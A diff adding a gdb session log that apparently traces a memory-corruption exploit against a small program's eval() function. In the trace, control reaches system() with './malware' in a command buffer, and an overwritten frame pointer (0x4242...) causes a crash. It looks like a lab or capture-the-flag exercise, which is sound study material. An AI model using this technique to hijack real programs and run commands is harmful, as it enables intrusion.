@@ -1,0 +1,30 @@
+Breakpoint 1 at 0x401a6b
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x0000000000401a6b in eval ()
+
+### returned into eval's system call site
+rip            0x401a6b            0x401a6b <eval+148>
+rdi            0x6030d0            6303952
+rsp            0x721000800ff0      0x721000800ff0
+0x6030d0 <command_buf>:	"./malware"
+
+### after system() returns: the frame pointer is attacker-controlled
+Breakpoint 2 at 0x401a75
+[Detaching after vfork from child process 661]
+sh: 1: ./malware: not found
+
+Breakpoint 2, 0x0000000000401a75 in eval ()
+rip            0x401a75            0x401a75 <eval+158>
+rbp            0x4242424242424242  0x4242424242424242
+rsp            0x721000800ff0      0x721000800ff0
+
+### let eval's epilogue run to its natural end
+Enter an expression (length up to 15):
+
+Program received signal SIGBUS, Bus error.
+0x0000000000401a85 in eval ()
+rip            0x401a85            0x401a85 <eval+174>
+#0  0x0000000000401a85 in eval ()
+Backtrace stopped: Cannot access memory at address 0x424242424242424a
